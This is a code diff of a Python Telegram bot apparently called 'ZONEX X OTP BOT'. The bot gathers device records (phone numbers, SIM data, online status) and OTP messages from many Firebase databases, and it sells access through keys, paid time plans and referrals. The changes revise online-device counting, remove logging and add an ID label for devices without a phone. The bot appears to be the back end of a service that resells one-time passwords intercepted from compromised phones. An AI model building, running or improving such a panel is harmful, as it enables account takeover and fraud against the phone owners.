@@ -2,10 +2,10 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════╗
-║        ZONEX X OTP BOT v4.7              ║
+║        ZONEX X OTP BOT v4.8              ║
 ║  Channel Gate · Key Entry · Time Plans   ║
 ║  Referral · Multi-Firebase · Admin Panel ║
-║  FIX: Unified Online Detection (Bulk)   ║
+║  FIX: Exact Online List & Count Match    ║
 ╚══════════════════════════════════════════╝
 """
 
@@ -134,7 +134,6 @@ def save_data(d: dict):
 
 async def _push_firestore(d: dict):
     if not GAPI_KEY:
-        logger.warning("⚠️ GAPI_KEY not set! Data not saved to Firebase.")
         return
     try:
         payload = json.dumps(d, separators=(",", ":"))
@@ -144,14 +143,12 @@ async def _push_firestore(d: dict):
             if r.status in (200, 201):
                 logger.info("✅ Firebase RTDB save successful")
             else:
-                body = await r.text()
-                logger.warning(f"❌ Firebase RTDB save failed: {r.status} - {body[:200]}")
+                logger.warning(f"❌ Firebase RTDB save failed: {r.status}")
     except Exception as e:
         logger.warning(f"❌ Firebase RTDB push error: {e}")
 
 async def _load_firestore() -> bool:
     if not GAPI_KEY:
-        logger.warning("⚠️ GAPI_KEY not set! Using local data only.")
         return False
     try:
         url = f"{FS_RTDB_URL}?auth={GAPI_KEY}"
@@ -180,15 +177,7 @@ async def _load_firestore() -> bool:
                 os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
                 with open(DATA_FILE, "w") as f:
                     json.dump(d, f, indent=2)
-                logger.info(f"✅ Firebase RTDB load OK — {len(d.get('users',{}))} users")
                 return True
-            elif r.status == 401:
-                logger.error(f"❌ Firebase auth failed! Check API key: {GAPI_KEY[:10]}...")
-            elif r.status == 404:
-                logger.info("ℹ️ Firebase: No cloud data yet, will create on first save")
-            else:
-                body = await r.text()
-                logger.warning(f"Firebase load: {r.status} - {body[:120]}")
     except Exception as e:
         logger.warning(f"Firebase load error: {e}")
     return False
@@ -198,9 +187,7 @@ data = load_data()
 async def _sync_from_firebase_on_startup():
     loaded = await _load_firestore()
     if not loaded:
-        logger.info("⚠️ Using local data.json (Firebase not available or empty)")
-    else:
-        logger.info("✅ Using Firebase data")
+        logger.info("⚠️ Using local data.json")
 
 # ─── Cache ────────────────────────────────────────────────────────────────────
 device_cache: dict   = {}
@@ -324,24 +311,20 @@ def kb_channels(missing: list[str]) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(rows)
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  ★★★ UNIFIED PHONE / ONLINE DETECTION (THE FIX) ★★★
+#  ★★★ UNIFIED PHONE / ONLINE DETECTION (ACCURATE) ★★★
 # ══════════════════════════════════════════════════════════════════════════════
 
-# Text placeholders that mean "no real phone"
-_BAD_PHONE_TOKENS = {
-    "unknown", "none", "null", "n/a", "na", "no number", "no phone",
-    "not available", "unavailable", "undefined", "invalid", "not found",
-    "—", "-", "–", "", "0", "00",
-}
-
 def _normalize_phone(ph) -> str:
-    """Clean up phone number. Strips spaces/dashes. Adds +91 if 10-digit Indian."""
     if ph is None:
         return "—"
     s = str(ph).strip()
-    if not s or s.lower() in _BAD_PHONE_TOKENS:
+    bad_words = {"unknown", "none", "null", "n/a", "na", "no number", "no phone", 
+                 "not available", "unavailable", "undefined", "invalid", "not found", 
+                 "—", "-", "–", "", "0", "00"}
+    if not s or s.lower() in bad_words:
         return "—"
-    # Keep only digits and leading +
+    
+    # Sirf digits aur leading plus rakho
     digits = re.sub(r"[^\d+]", "", s)
     if not digits or digits in ("+", ""):
         return "—"
@@ -357,10 +340,8 @@ def _normalize_phone(ph) -> str:
     return "—"
 
 def _has_valid_phone(info: dict) -> bool:
-    """TRUE if the device has a *real, usable* phone number."""
     if not isinstance(info, dict):
         return False
-    # Accept any of these keys (Firebase Android variants)
     raw = (
         info.get("phone") or info.get("mobNo") or info.get("phoneNumber")
         or info.get("mobile") or info.get("Mobile") or info.get("phone_number")
@@ -371,17 +352,13 @@ def _has_valid_phone(info: dict) -> bool:
     norm = _normalize_phone(raw)
     if norm == "—":
         return False
-    # Must have at least 6 digits after normalization
     if len(re.sub(r"\D", "", norm)) < 6:
         return False
     return True
 
 def _extract_phone(info: dict) -> str:
-    """Single source of truth for phone extraction from a Firebase client record.
-    Handles all common key variants + nested sims."""
     if not isinstance(info, dict):
         return "—"
-    # Try direct keys
     for k in ("mobNo", "phoneNumber", "phone", "mobile", "Mobile",
               "phone_number", "PhoneNumber", "contact", "number", "msisdn"):
         v = info.get(k)
@@ -389,7 +366,6 @@ def _extract_phone(info: dict) -> str:
             n = _normalize_phone(v)
             if n != "—":
                 return n
-    # Try nested sims
     sims = info.get("sims") or {}
     sim_list = sims if isinstance(sims, list) else list(sims.values())
     for sim in sim_list:
@@ -404,7 +380,6 @@ def _extract_phone(info: dict) -> str:
     return "—"
 
 def _is_online_fb(info: dict) -> bool:
-    """Read the Firebase 'online' flag from any of its common key names."""
     if not isinstance(info, dict):
         return False
     for k in ("status", "isOnline", "is_online", "online", "isActive", "active"):
@@ -421,24 +396,22 @@ def _is_online_fb(info: dict) -> bool:
     return False
 
 def _build_device_record(info: dict, dev_id: str) -> dict:
-    """Build the internal device dict from a raw Firebase client record.
-    This is used by BOTH refresh_firebase() and refresh_clients_only()
-    so the online logic is identical everywhere."""
     if not isinstance(info, dict):
         info = {}
     phone = _extract_phone(info)
     phone_ok = _has_valid_phone({"phone": phone}) if phone != "—" else False
     fb_online = _is_online_fb(info)
-    # ★ KEY FIX: a device is "online" when Firebase says it's online.
-    # Phone validity is used only for display / filtering of the list,
-    # NOT for changing the online flag itself.
     is_online = bool(fb_online)
+    
+    # Agar phone valid nahi hai, to list me ID dikhao taaki click ho sake
+    display_phone = phone if phone != "—" else f"ID-{dev_id[-6:]}"
+    
     ts_raw = (info.get("lastSeen") or info.get("last_seen")
               or info.get("lastOnline") or info.get("last_online") or "")
     return {
         "online":    is_online,
-        "has_phone": phone_ok,        # extra flag; list uses this
-        "phone":     phone,
+        "has_phone": phone_ok,
+        "phone":     display_phone, 
         "name":      str(info.get("modelName") or info.get("model")
                          or info.get("name") or dev_id),
         "battery":   str(info.get("battery", "—")),
@@ -452,7 +425,7 @@ def _build_device_record(info: dict, dev_id: str) -> dict:
     }
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  ★★★ FIREBASE FETCH (single source of truth) ★★★
+#  ★★★ FIREBASE FETCH ★★★
 # ══════════════════════════════════════════════════════════════════════════════
 
 async def fb_get(url: str, path: str, key: str = "") -> Optional[dict]:
@@ -494,15 +467,13 @@ async def fetch_otps(url: str, key: str, dev_id: str):
     return otps, last_any_dt
 
 async def refresh_firebase(cfg: dict):
-    """Full refresh: clients + OTPs. Also sets fb_conn_status."""
     url, key, label = cfg["url"], cfg.get("key", ""), cfg["label"]
     clients = await fb_get(url, "clients", key)
     if not isinstance(clients, dict):
-        # Could be auth error / unreachable / empty
         fb_conn_status[label] = "error"
         return
 
-    valid = []  # (dev_id, info_dict)
+    valid = []
     for dev_id, info in clients.items():
         if not isinstance(info, dict):
             continue
@@ -528,8 +499,6 @@ async def refresh_firebase(cfg: dict):
     fb_conn_status[label] = "ok"
 
 async def refresh_clients_only(cfg: dict):
-    """Fast refresh: only clients (no OTP fetch). Used by Bulk Add + online page.
-    Uses identical device-record builder as refresh_firebase()."""
     url, key, label = cfg["url"], cfg.get("key", ""), cfg["label"]
     clients = await fb_get(url, "clients", key)
     if not isinstance(clients, dict):
@@ -562,22 +531,13 @@ async def refresh_all():
         last_refresh = now_dt().strftime("%H:%M:%S")
         logger.info(f"✅ Refresh done | {last_refresh}")
 
-# ─── Counters (ALL use identical logic via device_cache) ─────────────────────
+# ─── Counters (Exact Match) ──────────────────────────────────────────────────
 def count_online() -> int:
-    """Count devices where online==True. Used by Stats + Firebase panel."""
+    # Count only if online is True
     return sum(
         1 for dm in device_cache.values()
         for d in dm.values()
         if d.get("online")
-    )
-
-def count_online_with_phone() -> int:
-    """Count devices that are online AND have a displayable phone.
-    Used by the /online list (kb_online)."""
-    return sum(
-        1 for dm in device_cache.values()
-        for d in dm.values()
-        if d.get("online") and d.get("has_phone")
     )
 
 def count_total() -> int:
@@ -587,12 +547,12 @@ def count_otps() -> int:
     return sum(len(ol) for om in otp_cache.values() for ol in om.values())
 
 def all_online() -> list:
-    """Return (label, dev_id, info) for every online device that has a phone."""
+    # Ab list me wahi dikhega jo online hai (phone chahe valid ho ya na ho, display me ID dikh jayegi)
     return [
         (lb, did, info)
         for lb, dm in device_cache.items()
         for did, info in dm.items()
-        if info.get("online") and info.get("has_phone")
+        if info.get("online")
     ]
 
 def resolve_label(esc: str) -> str:
@@ -1191,7 +1151,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     elif cb == "noop":                      await q.answer()
     else:                                   await q.answer()
 
-    # ── Check channels callback ──────────────────────────────────────────────
     if cb == "check_join":
         all_joined, missing = await check_channels(ctx.bot, uid)
         if not all_joined:
@@ -1265,7 +1224,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             )
         return
 
-    # ── Access check ────────────────────────────────────────────────────────
     if (not is_admin(uid) and not has_access(uid)
             and cb not in ("buy","refer","noop","check_join")
             and not cb.startswith("buy_plan:")):
@@ -1277,7 +1235,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ── Main Menu ────────────────────────────────────────────────────────────
     if cb == "main_menu":
         await q.edit_message_text(txt_welcome_panel(nm, uid), reply_markup=kb_main(uid),
                                    parse_mode="HTML")
@@ -1306,9 +1263,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         except Exception:
             pass
 
-    # ══════════════════════════════════════════════════════════════════════════
-    # ★★★ ONLINE DEVICES — uses unified refresh_clients_only() ★★★
-    # ══════════════════════════════════════════════════════════════════════════
     elif cb.startswith("online:"):
         pg = int(cb.split(":")[1])
         try:
@@ -1318,7 +1272,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 parse_mode="HTML")
         except Exception:
             pass
-        # Refresh clients for all DBs using unified logic
         async def _safe_clients(cfg):
             try:
                 await refresh_clients_only(cfg)
@@ -1463,7 +1416,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await q.edit_message_text(txt_welcome_panel(nm, uid), reply_markup=kb_main(uid),
                                    parse_mode="HTML")
 
-    # ── User Panel ───────────────────────────────────────────────────────────
     elif cb == "user_panel":
         if is_admin(uid):
             await q.edit_message_text(txt_welcome_panel(nm, uid), reply_markup=kb_main(uid),
@@ -1667,7 +1619,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await q.edit_message_text(
             txt_firebase_panel(), reply_markup=kb_firebase(), parse_mode="HTML")
 
-    # ★★★ FB Refresh — uses unified refresh_firebase() ★★★
     elif cb == "fb_refresh":
         if not is_admin(uid): await q.answer("⛔", show_alert=True); return
         try:
@@ -2054,7 +2005,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if text.startswith("/") and not (text == "/skip" and ud.get("fb_step") == "api_key"):
         return
 
-    # ── Key entry ──────────────────────────────────────────────────────────
     if ud.get("waiting_key"):
         correct = get_key(uid)
         if text.upper() != correct.upper():
@@ -2073,15 +2023,10 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             reply_markup=kb_main(uid), parse_mode="HTML")
         return
 
-    # ══════════════════════════════════════════════════════════════════════════
-    # ★★★ BULK ADD — NOW AWAITS REFRESH BEFORE SHOWING SUMMARY ★★★
-    # ══════════════════════════════════════════════════════════════════════════
     if ud.get("fb_step") == "bulk":
         if not is_admin(uid):
             ud.pop("fb_step", None); return
         ud.pop("fb_step")
-
-        # Extract URLs
         raw_found = re.findall(
             r"https?://[a-zA-Z0-9\-]+(?:-default-rtdb)?\.firebaseio\.com(?:/[^\s]*)?",
             text)
@@ -2091,7 +2036,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 candidate = "https://" + line
                 if re.match(r"https://[a-zA-Z0-9\-].*\.firebaseio\.com", candidate):
                     raw_found.append(candidate)
-
         seen_in_batch: set = set()
         existing_urls = {c["url"].rstrip("/") for c in data["firebase_configs"]}
         added, skipped, invalid = [], [], 0
@@ -2116,7 +2060,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         if added or skipped:
             save_data(data)
 
-        # ★★★ THE FIX: AWAIT the client fetch for every added DB BEFORE summary ★★★
         if added:
             await update.message.reply_text(
                 f"⏳ <b>Fetching live data from {len(added)} new DB(s)…</b>\n"
@@ -2135,7 +2078,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             await asyncio.gather(*[_fetch_new(c) for c in new_cfgs])
             last_refresh = now_dt().strftime("%H:%M:%S")
 
-        # Now compute per-DB online counts and overall
         total_processed = len(seen_in_batch) + invalid
         overall_online = count_online()
         overall_total  = count_total()
@@ -2178,7 +2120,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 InlineKeyboardButton("📱 Online Devices", callback_data="online:0"),
             ]])); return
 
-    # ── Firebase add — URL ───────────────────────────────────────────────────
     if ud.get("fb_step") == "url":
         if not is_admin(uid):
             ud.pop("fb_step", None); return
@@ -2230,7 +2171,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             "<i>Example: Main DB, Client 2, Backup</i>",
             parse_mode="HTML"); return
 
-    # ★★★ Single Firebase add — AWAIT refresh before showing result ★★★
     if ud.get("fb_step") == "label":
         if not is_admin(uid):
             ud.pop("fb_step", None); return
@@ -2255,7 +2195,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         data["firebase_configs"].append(new_cfg)
         save_data(data)
 
-        # Fetch immediately and AWAIT so counts are real
         try:
             await refresh_clients_only(new_cfg)
             conn_ok = fb_conn_status.get(label) == "ok"
@@ -2295,7 +2234,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 InlineKeyboardButton("👑 Admin",         callback_data="admin"),
             ]])); return
 
-    # ── Admin: Add/Reduce Time ───────────────────────────────────────────────
     if ud.get("awaiting_add_time") and is_admin(uid):
         ud.pop("awaiting_add_time")
         parts = text.split()
@@ -2333,7 +2271,6 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         except: pass
         return
 
-    # ── Admin: Refer Reward Hours ────────────────────────────────────────────
     if ud.get("awaiting_refer_hours") and is_admin(uid):
         ud.pop("awaiting_refer_hours")
         try:
@@ -2610,7 +2547,7 @@ async def _on_startup(app):
 def main():
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!"); return
-    logger.info("🚀 ZONEX X OTP Bot v4.7 starting...")
+    logger.info("🚀 ZONEX X OTP Bot v4.8 starting...")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channels: {CHANNELS}")
     logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
